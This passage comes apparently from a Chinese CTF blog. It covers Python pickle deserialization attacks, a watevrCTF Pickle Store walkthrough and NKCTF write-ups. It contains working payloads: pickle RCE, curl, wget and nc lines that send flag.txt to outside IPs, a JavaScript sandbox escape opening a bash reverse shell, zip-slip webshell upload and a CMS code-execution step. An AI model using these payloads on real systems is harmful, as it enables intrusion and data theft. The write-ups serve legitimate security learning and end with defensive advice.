3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 PEP 315<br><code>\8c\xx</code>+字符串，xx为长度<br><code>\x94</code>将前面的数据存入内存，可以看做是一段的结束<br><code>\x93</code>使用栈顶两个元素，<a href="http://xn--module-255j7672a.name">获取module.name</a><br><code>\x81</code>新建对象</p><hr><p>各个不同的版本实现的PVM操作码不同，但却是向下兼容的，比如上面python2序列化输出的opcode字符串可以放在python3里正常反序列化，但python3序列化输出的v3或v4地字符串却不能让python2反序列化</p><h1>BUILD指令(b)</h1><p>通过BUILD指令与C指令©的结合，我们可以把一个对象改写为os.system或其他函数假设某个类原先没有__setstate__方法，我们可以利用{‘<strong>setstate</strong>’: os.system}来BUILE这个对象<br>BUILD指令执行时，因为没有__setstate__方法，所以就执行update，这个对象的_setstate__方法就改为了我们指定的os.system<br>接下来利用&quot;ls /&quot;来再次BUILD这个对象，则会执行setstate(“ls /”)，而此时__setstate__已经被我们设置为os.system，因此实现RCE</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">pickle.loads(<span class="string">b&quot;c__main__\nuser\n)\x81&#125;(S&#x27;__setstate__&#x27;\ncos\nsystem\nub.&quot;</span>)</span><br><span class="line">pickle.loads(<span class="string">b&quot;c__main__\nuser\n)\x81&#125;(S&#x27;__setstate__&#x27;\ncos\nsystem\nubVcalc\nb.&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>\x81</code>用于创建新对象</p><hr><p>还有一种利用方法：利用__reduce__() 魔术方法：</p><p>可以通过重写类的object.<strong>reduce</strong>()使之在被实例化时按照重写的方式进行。具体而言，python要求该魔术方法返回一个元组(callable,[para1,para2…])，每当该类的对象被unpickle时，callable被调用生成对象（实际就是构造函数）</p><p>在pickle的opcode中，R的作用与object.<strong>reduce</strong>()关系密切：选择栈上的一个元素作为函数，另一个作为参数（必须为元组），然后调用该函数。其实R正好对应object.<strong>reduce</strong>()函数，让它的返回值作为R的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了R的</p><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name=<span class="string">&quot;test&quot;</span></span>):</span><br><span class="line">        self.name=name</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>,))</span><br><span class="line"> </span><br><span class="line">a = People()</span><br><span class="line">c = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">pickle.loads(c)</span><br></pre></td></tr></table></figure><p>输出<br>b&quot;\x80\x04\x95=\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04eval\x94\x93\x94\x8c!<strong>import</strong>(‘os’).system(‘whoami’)\x94\x85\x94<strong>R</strong>\x94.&quot;<br>pan\27104</p><h2 id="pickle的常用攻击方式">pickle的常用攻击方式</h2><ol><li class="lvl-3"><p>变量覆盖</p></li><li class="lvl-3"><p>RCE(反弹shell)</p></li></ol><p>这里我们暂时只用一道# [watevrCTF-2019]Pickle Store来举例展示</p><p><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/pickle_shop.png?raw=true" alt="pickle_shop"><br>题目进去是一个商店界面,初始有500刀,得到flag需要购买1000刀的Flag Pickle<br>然后购买上面两个商品发现每次购买后COOKIE的session都会改变,base64解码后可以发现是用pickle序列化后的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle  </span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">enc = <span class="string">&quot;gAN9cQAoWAUAAABtb25leXEBTXwBWAcAAABoaXN0b3J5cQJdcQMoWBQAAABZdW1teSBzbcO2cmfDpXNndXJrYXEEWBUAAABZdW1teSBzdGFuZGFyZCBwaWNrbGVxBVgVAAAAWXVtbXkgc3RhbmRhcmQgcGlja2xlcQZlWBAAAABhbnRpX3RhbXBlcl9obWFjcQdYIAAAADgwNzUzODY5ZmEzODNlOGFjNWQ2YWJhM2FiYWU3ZGMzcQh1Lg==&quot;</span>  </span><br><span class="line"><span class="built_in">print</span>(b64decode(enc))</span><br><span class="line"><span class="comment">#输出b&#x27;\x80\x03&#125;q\x00(X\x05\x00\x00\x00moneyq\x01M|\x01X\x07\x00\x00\x00historyq\x02]q\x03(X\x14\x00\x00\x00Yummy sm\xc3\xb6rg\xc3\xa5sgurkaq\x04X\x15\x00\x00\x00Yummy standard pickleq\x05X\x15\x00\x00\x00Yummy standard pickleq\x06eX\x10\x00\x00\x00anti_tamper_hmacq\x07X \x00\x00\x0080753869fa383e8ac5d6aba3abae7dc3q\x08u.&#x27;</span></span><br></pre></td></tr></table></figure><p>接着用pickle反序列化它</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle  </span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">enc = <span class="string">&quot;gAN9cQAoWAUAAABtb25leXEBTXwBWAcAAABoaXN0b3J5cQJdcQMoWBQAAABZdW1teSBzbcO2cmfDpXNndXJrYXEEWBUAAABZdW1teSBzdGFuZGFyZCBwaWNrbGVxBVgVAAAAWXVtbXkgc3RhbmRhcmQgcGlja2xlcQZlWBAAAABhbnRpX3RhbXBlcl9obWFjcQdYIAAAADgwNzUzODY5ZmEzODNlOGFjNWQ2YWJhM2FiYWU3ZGMzcQh1Lg==&quot;</span>  </span><br><span class="line"><span class="built_in">print</span>(pickle.loads(b64decode(enc)))</span><br><span class="line"><span class="comment">#输出&#123;&#x27;money&#x27;: 380, &#x27;history&#x27;: [&#x27;Yummy smörgåsgurka&#x27;, &#x27;Yummy standard pickle&#x27;, &#x27;Yummy standard pickle&#x27;], &#x27;anti_tamper_hmac&#x27;: &#x27;80753869fa383e8ac5d6aba3abae7dc3&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>可以看到pickle反序列化成功了,上面记录了我的余额,购买记录,以及后面跟着的加密算法验证这里我们就有了两个思路</p><h1>1. 利用RCE</h1><p>由于在BUU平台反弹shell较为繁琐,我就直接贴上其他师傅的exp</p><p>P3rh4ps师傅的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;curl -d @flag.txt 174.0.157.204:2333&#x27;)&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure><p>直接上传了flag.txt</p><p>ch4ser师傅的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&quot;wget &#x27;http://xss.buuoj.cn/index.php?do=api&amp;id=Krwr7k&#x27; --post-data=&#x27;location=&#x27;`cat flag.txt` -O-&quot;</span>,))</span><br></pre></td></tr></table></figure><p>这里用到了buuctf的xss平台</p><p>ice-cream师傅的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">           <span class="keyword">return</span> (os.system,(<span class="string">&#x27;nc 174.0.166.111 2333  &lt; flag.txt&#x27;</span>,))</span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure><p>使用nc反弹shell</p><h1>2.  覆盖key并伪造cookie</h1><p>解法二,he110world师傅介绍的解法</p><p>首先做一个实验:假如py脚本中已经定义了一个变量key，而反序列化的pickle流中包含了给key赋值的操作，那么反序列化后key的值会被覆盖吗，我们来验证一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;11111111111111111111111111111111&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;key=b&#x27;66666666666666666666666666666666&#x27;&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">pickle_a = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(pickle_a)</span><br><span class="line">pickle.loads(pickle_a)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b&quot;\x80\x03cbuiltins\nexec\nq\x00X&#x27;\x00\x00\x00key=b&#x27;66666666666666666666666666666666&#x27;q\x01\x85q\x02Rq\x03.&quot;</span><br><span class="line">b&#x27;66666666666666666666666666666666&#x27;</span><br></pre></td></tr></table></figure><p>成功覆盖</p><p>那么在这道题目中,一个是要讲余额覆盖为足够购买的金额,更重要的是要将签名的key密钥覆盖掉,进而伪造cookie</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"></span><br><span class="line">key=<span class="string">b&#x27;66666666666666666666666666666666&#x27;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;money&quot;</span>:<span class="number">10000</span>,<span class="string">&quot;history&quot;</span>:[]&#125;</span><br><span class="line">h = hmac.new(key)</span><br><span class="line">h.update(<span class="built_in">str</span>(cookies).encode())</span><br><span class="line">cookies[<span class="string">&quot;anti_tamper_hmac&quot;</span>] = h.digest().<span class="built_in">hex</span>()</span><br><span class="line">result2 = pickle.dumps(cookies)</span><br><span class="line"><span class="built_in">print</span>(result2)</span><br></pre></td></tr></table></figure><p>把余额设置为10000，并用我们自己的key来给cookie做签名，得到的pickle流：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&quot;\x80\x03&#125;q\x00(X\x05\x00\x00\x00moneyq\x01M\x10&#x27;X\x07\x00\x00\x00historyq\x02]q\x03X\x10\x00\x00</span><br></pre></td></tr></table></figure><p>key的值被成功覆盖</p><p>那么现在要做的就只有两件事,1 把flask的key覆盖为我们自己的key, 2 用我们自己的key给cookie加密</p><h3 id="1-flask中定义的key是全局变量，而反序列化操作却是在函数内部进行的，要使函数内的变量要覆盖全局变量的值，必须加global声明，所以修改payload：">1.flask中定义的key是全局变量，而反序列化操作却是在函数内部进行的，要使函数内的变量要覆盖全局变量的值，必须加global声明，所以修改payload：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;11111111111111111111111111111111&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global key;key=b&#x27;66666666666666666666666666666666&#x27;&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">pickle_a = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(pickle_a)</span><br><span class="line">pickle.loads(pickle_a)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure><h3 id="2-伪造cookie">2. 伪造cookie</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"></span><br><span class="line">key=<span class="string">b&#x27;66666666666666666666666666666666&#x27;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;money&quot;</span>:<span class="number">10000</span>,<span class="string">&quot;history&quot;</span>:[]&#125;</span><br><span class="line">h = hmac.new(key)</span><br><span class="line">h.update(<span class="built_in">str</span>(cookies).encode())</span><br><span class="line">cookies[<span class="string">&quot;anti_tamper_hmac&quot;</span>] = h.digest().<span class="built_in">hex</span>()</span><br><span class="line">result2 = pickle.dumps(cookies)</span><br><span class="line"><span class="built_in">print</span>(result2)</span><br></pre></td></tr></table></figure><p>只需要把第一个pickle流结尾表示结束的.去掉，把第二个pickle开头的版本声明去掉，两者拼接起来第一个pickle流：<br><code>b&quot;\x80\x03cbuiltins\nexec\nq\x00X4\x00\x00\x00global key;key = b'66666666666666666666666666666666'q\x01\x85q\x02Rq\x03&#125;.&quot;</code><br>第二个pickle流：<br><code>b&quot;\x80\x03&#125;q\x00(X\x05\x00\x00\x00moneyq\x01M\x10'X\x07\x00\x00\x00historyq\x02]q\x03X\x10\x00\x00\x00anti_tamper_hmacq\x04X \x00\x00\x00ccb487eec1cb66dda8d00a8121aeb4bfq\x05u.&quot;</code><br>按所说方法拼接：<br><code>b&quot;\x80\x03cbuiltins\nexec\nq\x00X4\x00\x00\x00global key;key = b'66666666666666666666666666666666'q\x01\x85q\x02Rq\x03&#125;q\x00(X\x05\x00\x00\x00moneyq\x01M\x10'X\x07\x00\x00\x00historyq\x02]q\x03X\x10\x00\x00\x00anti_tamper_hmacq\x04X \x00\x00\x00ccb487eec1cb66dda8d00a8121aeb4bfq\x05u.&quot;</code><br>base64编码后，抓下购买flag的包，修改其中的cookie发送</p><p>将返回的cookie反序列化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(base64.b64decode(<span class="string">b&#x27;gAN9cQAoWAUAAABtb25leXEBTSgjWAcAAABoaXN0b3J5cQJdcQNYKwAAAGZsYWd7MjM1NzllOTMtNjBmNi00YWIyLWIyOGMtYjIxMTg1NDhjYTlmfQpxBGFYEAAAAGFudGlfdGFtcGVyX2htYWNxBVggAAAANzQ1ZmVkMjk1MmIzM2YwOGVhYjhiZWU4ZGI2NWE3ZTlxBnUu&#x27;</span>)))</span><br></pre></td></tr></table></figure><p>输出{‘money’: 9000, ‘history’: [‘flag{23579e93-60f6-4ab2-b28c-b2118548ca9f}\n’], ‘anti_tamper_hmac’: ‘745fed2952b33f08eab8bee8db65a7e9’}</p><hr><p>pickle反序列化有一个专门的利用工具pker</p><p><a href="https://github.com/EddieIvan01/pker">https://github.com/EddieIvan01/pker</a></p><p>由于我自己也还没玩明白就暂时不作介绍了</p><h2 id="Python-反序列化漏洞如何防御"><strong>Python 反序列化漏洞如何防御</strong></h2><p>(1) 不要再不守信任的通道中传递 pcikle 序列化对象<br>(2) 在传递序列化对象前请进行签名或者加密，防止篡改和重播<br>(3) 如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据<br>(4) 将 pickle 加载的数据列入白名单</p><p>参考文章</p><ul class="lvl-0"><li class="lvl-2"><p><a href="https://blog.csdn.net/m0_65129142/article/details/121972449?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171154600916800197043396%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=171154600916800197043396&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-121972449-null-null.142%5Ev100%5Epc_search_result_base9&amp;utm_term=pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/m0_65129142/article/details/121972449?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171154600916800197043396%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=171154600916800197043396&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-121972449-null-null.142^v100^pc_search_result_base9&amp;utm_term=pickle反序列化&amp;spm=1018.2226.3001.4187</a></p></li><li class="lvl-2"><p><a href="https://blog.csdn.net/weixin_45805993/article/details/125304742?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-125304742.142%5Ev100%5Epc_search_result_base9&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_45805993/article/details/125304742?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=pickle反序列化&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-125304742.142^v100^pc_search_result_base9&amp;spm=1018.2226.3001.4187</a></p></li><li class="lvl-2"><p><a href="https://kksky.blue/post/python-pickle-fan-xu-lie-hua-lou-dong/">https://kksky.blue/post/python-pickle-fan-xu-lie-hua-lou-dong/</a></p></li><li class="lvl-2"><p><a href="https://xz.aliyun.com/t/7320?time__1311=n4%2BxnD0GDtebGkD9DBqrwe%2BmjGIPDODROrD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7320#toc-1">https://xz.aliyun.com/t/7320?time__1311=n4%2BxnD0GDtebGkD9DBqrwe%2BmjGIPDODROrD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7320#toc-1</a></p></li><li class="lvl-2"><p><a href="https://xz.aliyun.com/t/7320?time__1311=n4%2BxnD0GDtebGkD9DBqrwe%2BmjGIPDODROrD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7320#toc-2">https://xz.aliyun.com/t/7320?time__1311=n4%2BxnD0GDtebGkD9DBqrwe%2BmjGIPDODROrD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7320#toc-2</a></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> pickle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NKCTF_WP</title>
      <link href="/2024/03/25/NKCTF-WP/"/>
      <url>/2024/03/25/NKCTF-WP/</url>
      
        <content type="html"><![CDATA[<p>其实这次比赛真正思考的时间不多，和学会的内部赛冲突了，少了8个小时，打完内部赛之后就跟着学长们的思路复现了。这两天给大脑输入了太多东西，学长们的思路也没来的及消化，就借这篇半引用的WP帮自己梳理一下，也存档一下</p><h1>WEB</h1><h1>my_first_cms</h1><p>题目是的框架用的是cms-made-simple</p><blockquote><p>后台密码</p><p>admin/Admin123</p><p>1 ) log in as admin and go to Extensions &gt; User Defined Tags &gt;</p><p>2 ) Write in Code place payload &gt; <code>&lt;?php echo system('id'); ?&gt;</code></p><p>3 ) After click run you will be see result :</p><p>uid=1000(admin) gid=1000(admin) groups=1000(admin) uid=1000(admin) gid=1000(admin) groups=1000(admin)</p></blockquote><p>漏洞文章<a href="https://hub.packtpub.com/cms-made-simple-application-user-defined-tags/">https://hub.packtpub.com/cms-made-simple-application-user-defined-tags/</a><br>省流版<a href="https://packetstormsecurity.com/files/177241/CMS-Made-Simple-2.2.19-Remote-Code-Execution.html">https://packetstormsecurity.com/files/177241/CMS-Made-Simple-2.2.19-Remote-Code-Execution.html</a></p><h3 id="工作原理">工作原理</h3><p>用户自定义标签通过将PHP代码与Smarty模板引擎识别的标签关联起来。当Smarty解析模板遇到该标签时，它会执行相关的PHP代码，并将标签标记替换为PHP代码的输出</p><p>一开始我自己找到的文章不对，是这个框架的另一个SSTI洞，后来5x给出了正确的漏洞文章，按步骤找到对应页面粘贴上payload，换成 <code>ls /</code>然后<code>cat flag</code>皆可</p><p><img src="/pic/flag1.png" alt="flag1"></p><p>吐槽一下自己猜弱口令经验太少，一开始admin123都试了居然没试Admin123</p><h1>用过就是熟悉</h1><blockquote><p>用户账号密码在数据库文件中</p><p>admin/!@!@!@!@NKCTFNKCTFChu0</p><p>guest/!@!@!@!@NKCTFChu0</p><p>在本地搞个压缩包，里面放webshell</p><p>登录后台，将压缩包上传</p><p><img src="https://m5e1ff9fy3.feishu.cn/space/api/box/stream/download/asynccode/?code=YTYzZTNlNjc2NmFlMGU4N2M3ZTEyNTJmZjdjNmFiYjFfVEpETWd3RVdpenAxVUdlR3dpNjE0OHlBOEVuS2VpYllfVG9rZW46U1p4QWJHYVdXb05MRTl4eFdEZWNJNU5JbkdjXzE3MTEyOTM5OTM6MTcxMTI5NzU5M19WNA" alt=""></p><p>修改数据包中的pathto为%7D%2F%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f</p><p>之后就能跨目录解压到</p><p><a href="http://8629d181-00ee-4ebd-8caa-c23531b6d2a1.node.nkctf.yuzhian.com.cn/">http://8629d181-00ee-4ebd-8caa-c23531b6d2a1.node.nkctf.yuzhian.com.cn/</a>}/shell.php</p><p><img src="https://m5e1ff9fy3.feishu.cn/space/api/box/stream/download/asynccode/?code=NTk5YzkwOGYzM2Q2YjQ2ZjdiZGYyMGRkOGQ2Y2MyZmVfa29Sem5jeUNJRENPVGl5aUdwazVHeEdpWm4yejdNNzdfVG9rZW46WWZyYWIxWG1Cb2g1WUh4alVxc2NzMXA4bkdFXzE3MTEyOTM5OTM6MTcxMTI5NzU5M19WNA" alt=""></p></blockquote><p>这题主要利用的漏洞是压缩包slip</p><p>Zip Slip是一个广泛存在的漏洞，除了Java语言，JavaScript，Ruby，.NET和Go都有此问题。</p><p>利用此漏洞有两个前提：</p><ul class="lvl-0"><li class="lvl-2"><p>有恶意的压缩文件（这一点我们可以自己构造）</p></li><li class="lvl-2"><p>提取代码不会执行目录检查。</p></li></ul><p>恶意的压缩文件一般包含<code>../</code>目录，从而解压时会跳出当前目录。</p><p>提取代码一般会得到压缩文件中的文件目录，如果不对这些目录进行校验则会出现slip问题</p><pre><code>学长说这种漏洞在实际场景中还是很常见的，很多cms还有这种洞参考文献：</code></pre><p>​</p><p><img src="/pic/ck.png" alt="ck"></p><p>这题要重视</p><h1>最简单的CTF</h1><p>题目有一个js代码的提交窗口，可以填入任意代码submit，源码有waf</p><blockquote><h1>反弹shell,大小写绕过,getOwnPropertyDescriptor获取所有属性值</h1></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> code = <span class="string">`throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">    get: function() &#123;</span></span><br><span class="line"><span class="string">        const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">        const p = (cc.constructor.constructor(&#x27;return PROCESS&#x27;.toLowerCase()))();</span></span><br><span class="line"><span class="string">        return Object.getOwnPropertyDescriptor(p.mainModule.require(&#x27;child_Process&#x27;.toLowerCase()), &#x27;EXEC&#x27;.toLowerCase()).value(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.115.225.25/2333 0&gt;&amp;1&quot;&#x27;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;)</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure><p>sorry这题还没机会看太多源码，不是太清楚为什么要打这段payload<br>收获最多的是逼着我当晚上腾讯云搞了个服务器，终于可以在公网接收反弹shell了</p><p><img src="/pic/shell2.png" alt="shell2"></p><p><img src="/pic/shell1.png" alt="shell1"></p><h1>attack_tacooooo</h1><p><a href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/Details">https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/Details</a></p><h3 id="Root-Cause-Analysis">Root Cause Analysis</h3><blockquote><p>pgAdmin4 uses a file-based session management approach. The session files are saved on disk as pickle objects. When a user performs a request, the value of the session cookie <code>pga4_session</code> is used to retrieve the file, then it’s content is deserialized, and finally its signature verified.</p></blockquote><blockquote><p>The <code>ManagedSessionInterface</code> class implements flask’s <code>SessionInterface</code> to read the user’s cookie and translate it into their session</p></blockquote><blockquote><p>The cookie value is split in 2 parts at the first <code>!</code> character. The first part is the session ID (<code>sid</code>), while the second is the session digest.</p></blockquote><blockquote><p>The vulnerability lies in the <code>FileBackedSessionManager.get</code> method that loads session files by concatenating the <code>sessions</code> folder - located inside the pgAdmin4 <code>DATA_DIR</code> - with the session ID. Precisely, the two values are concatenated using the <a href="https://docs.python.org/3/library/os.path.html#os.path.join"><code>os.path.join</code></a> function.</p></blockquote><blockquote><p>This function has two weaknesses:</p></blockquote><ul class="lvl-0"><li class="lvl-2"><blockquote><p>It does not set a trusted base-path which should not be escaped, therefore <code>os.path.join(&quot;/opt/safe/&quot;, &quot;../../etc/passwd&quot;)</code> returns <code>/etc/passwd</code>.</p></blockquote></li><li class="lvl-2"><blockquote><p>It uses the right-most absolute path in its arguments as the root path, therefore <code>os.path.join(&quot;./safe/&quot;, &quot;do_not_escape_from_here&quot;, &quot;/etc/passwd&quot;)</code> returns <code>/etc/passwd</code>.</p></blockquote></li></ul><p>没什么好说的，真的就是按着文章打，经复现测试少一步都不行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 